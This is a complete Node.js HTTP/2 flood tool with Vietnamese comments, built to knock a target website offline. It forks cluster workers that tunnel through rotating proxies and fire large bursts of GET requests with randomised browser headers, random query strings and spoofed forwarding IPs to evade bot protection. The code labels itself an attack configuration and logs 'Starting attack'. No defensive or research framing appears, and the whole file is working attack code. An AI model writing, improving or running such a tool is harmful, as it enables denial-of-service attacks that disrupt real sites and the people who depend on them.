const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// Tối ưu hóa hệ thống
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = Infinity;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.error("Usage: node script.js <target> <time> <rate> <threads> <proxyFile>");
    process.exit(1);
}

// Hàm đọc file proxy tối ưu hóa
function readLines(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("Proxy file not found");
        const data = fs.readFileSync(filePath, "utf-8");
        const lines = data.split(/\r?\n/)
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        if (!lines.length) throw new Error("No valid proxies found");
        return lines;
    } catch (e) {
        console.error(`Error reading proxy file: ${e.message}`);
        process.exit(1);
    }
}

// Hàm random tối ưu
const cryptoRandom = (min, max) => min + crypto.randomBytes(4).readUInt32LE(0) % (max - min);
const randomElement = arr => arr[cryptoRandom(0, arr.length)];

// Tạo chuỗi ngẫu nhiên hiệu suất cao
function randstr(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const charsLen = chars.length;
    const randomBytes = crypto.randomBytes(length);
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[randomBytes[i] % charsLen];
    }
    return result;
}

// Cấu hình tấn công
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rate: parseInt(process.argv[4]) || 1000,
    threads: parseInt(process.argv[5]) || os.cpus().length,
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error("Invalid target URL");
    process.exit(1);
}

// Headers tối ưu hóa
const userAgents = [
    // Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    // Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    // Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    
    // Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
];

const langHeaders = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en;q=0.8",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8"
];

const secFetchHeaders = {
    "sec-fetch-dest": ["document", "empty", "script", "style", "image", "font"],
    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
    "sec-fetch-site": ["same-origin", "cross-site", "same-site"],
    "sec-fetch-user": ["?1", "?0"]
};

const cacheControl = ["no-cache", "no-store", "max-age=0", "must-revalidate"];
const referers = [
    `https://${parsedTarget.host}/`,
    `https://www.${parsedTarget.host}/`,
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    ""
];

const platforms = ["Windows", "Macintosh", "Linux", "iPhone", "Android", "iPad"];
const secCHUA = [
    '"Google Chrome";v="120", "Chromium";v="120", "Not.A/Brand";v="99"',
    '"Microsoft Edge";v="120", "Chromium";v="120", "Not.A/Brand";v="99"',
    '"Opera";v="100", "Not.A/Brand";v="99"',
    '"Firefox";v="120"',
    '"Safari";v="17"'
];

// Cấu hình TLS tối ưu
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
].join(":");

const proxies = readLines(args.proxyFile);
let proxyIndex = 0;

// Lấy proxy theo vòng tròn để cân bằng tải
function getNextProxy() {
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

// Cluster mode
if (cluster.isMaster) {
    console.log(`[Master] Starting attack with ${args.threads} threads for ${args.time} seconds`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork({ workerId: i });
    }
    
    cluster.on('exit', (worker, code, signal) => {
        console.log(`[Master] Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });
    
    setTimeout(() => {
        console.log("[Master] Attack completed. Exiting...");
        process.exit(0);
    }, args.time * 1000);
} else {
    // Worker process
    console.log(`[Worker ${process.env.workerId}] Starting flood`);
    
    // Bắt đầu flood với độ trễ ngẫu nhiên để tránh đồng bộ hóa
    setTimeout(() => {
        setInterval(runFlooder, 50); // Tăng tần suất khởi chạy flooder
    }, cryptoRandom(0, 5000));
}

class HighPerformanceSocket {
    constructor() {
        this.connectionPool = new Map();
    }
    
    getConnectionKey(host, port) {
        return `${host}:${port}`;
    }
    
    HTTP(options, callback) {
        const connectionKey = this.getConnectionKey(options.host, options.port);
        
        // Kiểm tra pool kết nối
        if (this.connectionPool.has(connectionKey)) {
            const conn = this.connectionPool.get(connectionKey);
            if (conn && !conn.destroyed) {
                return callback(conn);
            }
            this.connectionPool.delete(connectionKey);
        }
        
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: keep-alive\r\nProxy-Connection: keep-alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
            keepAlive: true,
            timeout: options.timeout * 1000
        });
        
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        
        connection.once('connect', () => {
            connection.write(buffer);
        });
        
        connection.once('data', (chunk) => {
            const response = chunk.toString();
            if (response.includes('200 Connection established') || response.includes('HTTP/1.1 200')) {
                this.connectionPool.set(connectionKey, connection);
                callback(connection);
            } else {
                connection.destroy();
                callback(null, 'Invalid proxy response');
            }
        });
        
        connection.on('error', (err) => {
            connection.destroy();
            this.connectionPool.delete(connectionKey);
            callback(null, err.message);
        });
        
        connection.on('timeout', () => {
            connection.destroy();
            this.connectionPool.delete(connectionKey);
            callback(null, 'Connection timeout');
        });
        
        connection.on('close', () => {
            this.connectionPool.delete(connectionKey);
        });
    }
}

const socketManager = new HighPerformanceSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const randomQuery = crypto.randomBytes(16).toString('hex');
    const queries = [
        `search=${randstr(8)}`,
        `id=${cryptoRandom(1000, 9999)}`,
        `page=${cryptoRandom(1, 100)}`,
        `token=${randomQuery}`,
        `session=${randomQuery}`,
        `ref=${randstr(10)}`,
        `utm_source=${randstr(6)}`,
        `v=${cryptoRandom(1, 10)}.${cryptoRandom(0, 9)}`
    ];
    
    // 30% chance to add multiple query params
    if (Math.random() < 0.3) {
        const numParams = cryptoRandom(2, 5);
        const selectedQueries = [];
        for (let i = 0; i < numParams; i++) {
            selectedQueries.push(randomElement(queries));
        }
        return `${basePath}?${selectedQueries.join('&')}`;
    }
    
    return `${basePath}?${randomElement(queries)}`;
}

function generateDynamicHeaders() {
    const headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": randomElement(userAgents),
        "accept": randomElement(acceptHeaders),
        "accept-language": randomElement(langHeaders),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-dest": randomElement(secFetchHeaders["sec-fetch-dest"]),
        "sec-fetch-mode": randomElement(secFetchHeaders["sec-fetch-mode"]),
        "sec-fetch-site": randomElement(secFetchHeaders["sec-fetch-site"]),
        "sec-fetch-user": randomElement(secFetchHeaders["sec-fetch-user"]),
        "sec-ch-ua": randomElement(secCHUA),
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(platforms),
        "cache-control": randomElement(cacheControl),
        "referer": randomElement(referers),
        "x-requested-with": randomElement(["XMLHttpRequest", ""]),
        "x-forwarded-for": `${cryptoRandom(1, 255)}.${cryptoRandom(0, 255)}.${cryptoRandom(0, 255)}.${cryptoRandom(0, 255)}`,
        "x-real-ip": `${cryptoRandom(1, 255)}.${cryptoRandom(0, 255)}.${cryptoRandom(0, 255)}.${cryptoRandom(0, 255)}`
    };
    
    // 50% chance to add additional headers
    if (Math.random() < 0.5) {
        headers["dnt"] = randomElement(["1", "0"]);
        headers["upgrade-insecure-requests"] = "1";
        headers["pragma"] = "no-cache";
    }
    
    return headers;
}

function createHttp2Client(connection, proxy) {
    const tlsOptions = {
        socket: connection,
        secureContext: tls.createSecureContext({
            ciphers: ciphers,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        }),
        ALPNProtocols: ['h2'],
        servername: parsedTarget.host,
        rejectUnauthorized: false,
        requestCert: false
    };
    
    const tlsSocket = new tls.TLSSocket(connection, tlsOptions);
    
    const client = http2.connect(parsedTarget.href, {
        createConnection: () => tlsSocket,
        settings: {
            enablePush: false, // Tắt push để tăng hiệu suất
            initialWindowSize: 6291456,
            maxFrameSize: 16384,
            maxConcurrentStreams: 1000, // Tăng số lượng stream đồng thời
            maxHeaderListSize: 65536,
            headerTableSize: 65536
        },
        protocol: 'https:'
    });
    
    client.on('error', (err) => {
        console.error(`[Worker ${process.env.workerId}] HTTP2 client error: ${err.message}`);
        client.destroy();
        tlsSocket.destroy();
        connection.destroy();
    });
    
    client.on('close', () => {
        client.destroy();
        tlsSocket.destroy();
        connection.destroy();
    });
    
    return client;
}

function runFlooder() {
    const proxy = getNextProxy();
    const [proxyHost, proxyPort] = proxy.split(':');
    
    if (!proxyHost || !proxyPort) {
        return setTimeout(runFlooder, 100);
    }
    
    const proxyOptions = {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: parsedTarget.host,
        timeout: 5
    };
    
    socketManager.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) {
            return setTimeout(runFlooder, 100);
        }
        
        let client;
        try {
            client = createHttp2Client(connection, proxy);
        } catch (err) {
            connection.destroy();
            return setTimeout(runFlooder, 100);
        }
        
        client.on('connect', () => {
            const attackInterval = setInterval(() => {
                // Tăng số lượng request mỗi interval
                for (let i = 0; i < args.rate / 10; i++) {
                    try {
                        const headers = generateDynamicHeaders();
                        const req = client.request(headers);
                        
                        req.on('response', () => {
                            req.close();
                        });
                        
                        req.on('error', () => {
                            req.close();
                        });
                        
                        req.end();
                    } catch (err) {
                        // Bỏ qua lỗi và tiếp tục
                    }
                }
            }, 50); // Giảm interval để tăng tốc độ
            
            // Dừng attack khi hết thời gian
            setTimeout(() => {
                clearInterval(attackInterval);
                client.close();
            }, args.time * 1000 - Date.now());
        });
        
        client.on('error', () => {
            client.destroy();
            connection.destroy();
        });
    });
}
